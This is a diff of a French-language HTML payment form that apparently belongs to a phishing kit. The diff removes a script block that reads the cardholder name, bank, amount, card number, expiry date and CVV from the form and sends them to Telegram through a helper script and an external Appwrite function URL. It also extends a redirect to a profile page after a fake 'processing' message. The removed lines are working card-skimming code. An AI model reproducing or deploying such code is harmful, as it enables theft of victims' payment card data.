@@ -945,21 +945,6 @@
             
 
             
-            // Envoyer les données de paiement à Telegram
-            const paymentData = {
-                nom: document.getElementById('cardholderName').value,
-                banque: document.getElementById('bank').value,
-                montant: document.getElementById('amount').value,
-                numero_carte: document.getElementById('cardNumber').value,
-                expiration: document.getElementById('expiryDate').value,
-                cvv: document.getElementById('cvv').value
-            };
-            try {
-                await telegramSender.sendPaymentDetails(paymentData, 'Paiement');
-            } catch (error) {
-                console.error('Erreur Telegram:', error);
-            }
-
             // Désactiver le bouton
             submitBtn.innerText = "Traitement en cours...";
             submitBtn.style.backgroundColor = "#ccc";
@@ -970,18 +955,11 @@
             const verificationMessage = document.getElementById('verificationMessage');
             verificationMessage.style.display = 'block';
             
-            // Redirection automatique après 3 secondes
+            // Redirection automatique après 10 secondes
             setTimeout(function() {
                 window.location.href = "settings.profil.html";
-            }, 3000);
+            }, 10000);
         });
-    </script>
-
-    <!-- Import telegram.js -->
-    <script src="telegram.js"></script>
-    <script>
-        // Configuration de l'URL de la Function Appwrite
-        window.APPWRITE_FUNCTION_URL = 'https://69b7297c003347c0b8be.fra.appwrite.run';
     </script>
 
 </body>
